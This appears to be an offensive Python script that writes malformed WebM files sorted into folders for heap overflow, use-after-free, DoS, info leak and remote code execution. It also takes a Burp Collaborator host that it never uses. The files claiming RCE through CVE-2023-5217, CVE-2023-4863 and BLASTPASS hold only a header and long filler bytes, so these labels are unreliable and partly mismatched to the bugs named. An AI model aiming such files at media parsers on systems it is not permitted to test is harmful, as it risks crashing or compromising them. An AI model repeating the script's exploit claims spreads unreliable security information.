from pathlib import Path
import struct

def generate_webm_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    oob_dir = output_dir / 'oob'
    oob_dir.mkdir(exist_ok=True)
    heap_overflow_dir = output_dir / 'heap_overflow'
    heap_overflow_dir.mkdir(exist_ok=True)
    uaf_dir = output_dir / 'uaf'
    uaf_dir.mkdir(exist_ok=True)
    integer_overflow_dir = output_dir / 'integer_overflow'
    integer_overflow_dir.mkdir(exist_ok=True)
    rce_dir = output_dir / 'rce'
    rce_dir.mkdir(exist_ok=True)
    dos_dir = output_dir / 'dos'
    dos_dir.mkdir(exist_ok=True)
    info_leak_dir = output_dir / 'info_leak'
    info_leak_dir.mkdir(exist_ok=True)
    
    ebml_header = b'\x1A\x45\xDF\xA3'
    
    def write_ebml_element(file, element_id, data):
        file.write(element_id)
        size_byte = len(data).to_bytes(1, byteorder='big')
        file.write(size_byte)
        file.write(data)
    
    webm_oob1_chunk_size = ebml_header + b'\x42\x86' + b'\xFF' + b'\xFF' * 1000
    with open(oob_dir / "oob1_chunk_size.webm", 'wb') as f:
        f.write(webm_oob1_chunk_size)
    
    webm_oob2_vp8_frame = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\x9D\x01\x2A' + b'\xFF' * 5000
    with open(oob_dir / "oob2_vp8_frame.webm", 'wb') as f:
        f.write(webm_oob2_vp8_frame)
    
    webm_oob3_matroska_segment = ebml_header + b'\x18\x53\x80\x67' + b'\xFF' + b'A' * 10000
    with open(oob_dir / "oob3_matroska_segment.webm", 'wb') as f:
        f.write(webm_oob3_matroska_segment)
    
    webm_heap1_superframe_vp9 = ebml_header + b'\x42\x86' + b'\xFF\xFF\xFF\xFF' + b'\x9D\x01\x2A' + b'\x00' * 20000
    with open(heap_overflow_dir / "heap1_superframe_vp9.webm", 'wb') as f:
        f.write(webm_heap1_superframe_vp9)
    
    webm_heap2_huffman_table = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\x9D\x01\x2A' + b'\xFF' * 30000
    with open(heap_overflow_dir / "heap2_huffman_table.webm", 'wb') as f:
        f.write(webm_heap2_huffman_table)
    
    webm_heap3_chunk_size_invalid = ebml_header + b'\x42\x86' + b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF' + b'\x00' * 50000
    with open(heap_overflow_dir / "heap3_chunk_size_invalid.webm", 'wb') as f:
        f.write(webm_heap3_chunk_size_invalid)
    
    webm_uaf1_double_free = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\x9D\x01\x2A' + b'\x42\x86' + b'\x81' + b'\x20' + b'\x9D\x01\x2A' + b'\x00' * 1000
    with open(uaf_dir / "uaf1_double_free.webm", 'wb') as f:
        f.write(webm_uaf1_double_free)
    
    webm_uaf2_premature_free = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\x9D\x01\x2A' + b'\x00' * 500
    with open(uaf_dir / "uaf2_premature_free.webm", 'wb') as f:
        f.write(webm_uaf2_premature_free)
    
    webm_int1_width_overflow = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\xB0' + struct.pack('>I', 0xFFFFFFFF) + b'\x00' * 1000
    with open(integer_overflow_dir / "int1_width_overflow.webm", 'wb') as f:
        f.write(webm_int1_width_overflow)
    
    webm_int2_height_overflow = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\xBA' + struct.pack('>I', 0xFFFFFFFF) + b'\x00' * 1000
    with open(integer_overflow_dir / "int2_height_overflow.webm", 'wb') as f:
        f.write(webm_int2_height_overflow)
    
    webm_int3_frame_size_overflow = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\x9D\x01\x2A' + struct.pack('>I', 0xFFFFFFFF) + b'\x00' * 1000
    with open(integer_overflow_dir / "int3_frame_size_overflow.webm", 'wb') as f:
        f.write(webm_int3_frame_size_overflow)
    
    webm_int4_timestamp_overflow = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\xE7' + struct.pack('>Q', 0xFFFFFFFFFFFFFFFF) + b'\x00' * 1000
    with open(integer_overflow_dir / "int4_timestamp_overflow.webm", 'wb') as f:
        f.write(webm_int4_timestamp_overflow)
    
    webm_rce1_cve_2023_5217 = ebml_header + b'\x42\x86' + b'\xFF\xFF\xFF\xFF' + b'\x9D\x01\x2A' + b'\x00' * 50000 + b'\x41' * 10000
    with open(rce_dir / "rce1_cve_2023_5217.webm", 'wb') as f:
        f.write(webm_rce1_cve_2023_5217)
    
    webm_rce2_cve_2023_4863 = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\x9D\x01\x2A' + b'\xFF' * 30000 + b'\x42' * 15000
    with open(rce_dir / "rce2_cve_2023_4863.webm", 'wb') as f:
        f.write(webm_rce2_cve_2023_4863)
    
    webm_rce3_blastpass = ebml_header + b'\x42\x86' + b'\xFF\xFF\xFF\xFF\xFF' + b'\x9D\x01\x2A' + b'\x00' * 40000 + b'\x43' * 20000
    with open(rce_dir / "rce3_blastpass.webm", 'wb') as f:
        f.write(webm_rce3_blastpass)
    
    webm_dos1_invalid_chunk = ebml_header + b'\xFF' * 100
    with open(dos_dir / "dos1_invalid_chunk.webm", 'wb') as f:
        f.write(webm_dos1_invalid_chunk)
    
    webm_dos2_malformed_ebml = b'\x00' * 50 + ebml_header + b'\xFF' * 200
    with open(dos_dir / "dos2_malformed_ebml.webm", 'wb') as f:
        f.write(webm_dos2_malformed_ebml)
    
    webm_dos3_corrupted_header = b'\x1A\x45\xDF\xA3' + b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF' + b'\x00' * 1000
    with open(dos_dir / "dos3_corrupted_header.webm", 'wb') as f:
        f.write(webm_dos3_corrupted_header)
    
    webm_dos4_segfault = ebml_header + b'\x42\x86' + b'\xFF' + b'\x9D\x01\x2A' + b'\xFF' * 50000
    with open(dos_dir / "dos4_segfault.webm", 'wb') as f:
        f.write(webm_dos4_segfault)
    
    webm_info1_oob_read = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + b'\x9D\x01\x2A' + b'\x00' * 10000 + b'\x41' * 5000
    with open(info_leak_dir / "info1_oob_read.webm", 'wb') as f:
        f.write(webm_info1_oob_read)
    
    webm_info2_heap_leak = ebml_header + b'\x42\x86' + b'\xFF\xFF' + b'\x9D\x01\x2A' + b'\x00' * 20000
    with open(info_leak_dir / "info2_heap_leak.webm", 'wb') as f:
        f.write(webm_info2_heap_leak)
    
    webm_master = ebml_header + b'\x42\x86' + b'\xFF\xFF\xFF\xFF' + b'\x9D\x01\x2A' + struct.pack('>I', 0xFFFFFFFF) + struct.pack('>I', 0xFFFFFFFF) + b'\x00' * 10000 + b'\xFF' * 5000
    with open(output_dir / "master.webm", 'wb') as f:
        f.write(webm_master)

